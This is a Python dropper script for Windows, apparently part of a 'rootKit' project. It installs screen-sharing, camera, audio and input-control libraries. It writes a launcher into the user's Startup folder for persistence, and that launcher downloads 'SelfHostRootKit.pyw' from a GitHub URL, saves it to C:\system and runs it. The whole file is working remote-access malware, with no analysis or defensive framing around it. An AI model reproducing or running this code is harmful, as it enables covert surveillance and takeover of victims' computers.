# ! create file in C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup and C:/system #
from os import remove, chdir, system
from shutil import move
from time import sleep
githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
try:
    import easyimporting
except:
    system("pip install easyimporting")
    system('dl.py')
    exit()
try:
    from vidstream import ScreenShareClient, CameraClient
    import pyautogui, socket, lib_platform, pyaudio
except:
    easyimporting.importing("vidstream pyautogui lib_platform pyaudio")
    system('dl.py')
    exit()

with open('lancement.pyw', 'w') as file:
    file.write("""
from os import remove, chdir, mkdir
from urllib.request import urlopen
from shutil import move
from subprocess import Popen
with open("SelfHostRootKit.pyw", 'w'):
    pass
with open("SelfHostRootKit.pyw", "a") as file:
    file.write((urlopen('https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/SelfHostRootKit.pyw')).read().decode())
try:
    remove("C:\system/SelfHostRootKit.pyw")
except:
    pass
try:
    mkdir('C:\system')
except:
    pass
move('SelfHostRootKit.pyw', 'C:\system')
chdir("C:\system")
Popen("start SelfHostRootKit.pyw", shell=True)""")
try:
    remove("C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup/lancement.pyw")
except:
    pass
move('lancement.pyw', 'C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
chdir('C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
system('start lancement.pyw')
